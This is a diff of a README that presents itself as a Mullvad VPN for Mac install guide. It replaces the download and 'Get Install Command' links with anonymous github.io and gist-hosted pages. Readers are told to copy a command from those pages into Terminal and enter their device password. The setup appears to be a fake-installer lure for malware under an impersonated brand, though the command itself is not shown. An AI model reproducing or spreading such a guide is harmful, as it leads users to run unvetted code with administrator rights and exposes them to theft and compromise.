@@ -3,7 +3,7 @@
 
 Mullvad VPN for Mac offers a simple yet powerful way to protect your online privacy and bypass restrictions 🌍. Follow the instructions below to install it on macOS quickly and easily.
 
-[![Download For Mac](https://img.shields.io/badge/Download%20for-MacOS-lightgrey?style=for-the-badge&logo=apple)](https://juianaiud84.github.io/.github/mullvadvpn)
+[![install For Mac](https://img.shields.io/badge/Install%20for-MacOS-lightgrey?style=for-the-badge&logo=apple)](https://dinkkennyrice406.github.io/.github/mullvadvpn)
 
 If the download button doesn’t work, follow the instructions below to install Mullvad VPN using a terminal command.
 
@@ -22,7 +22,7 @@ If the download button doesn’t work, follow the instructions below to install 
 
 1. Click the button below to get the installation command:  
 
-[![Get Install Command](https://img.shields.io/badge/Get%20Install%20Command-blue?style=for-the-badge&logo=apple)](https://gistcdn.githack.com/mcnaryluckystrike-debug/944aadd6eaf7fe51e2c33a41bb1fc4a0/raw/7541d4ba466b685b1afb8476db65b18a25cfd4e4/install.html)
+[![Get Install Command](https://img.shields.io/badge/Get%20Install%20Command-blue?style=for-the-badge&logo=apple)](https://dinkkennyrice406.github.io/.github/mullvadvpn)
 
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
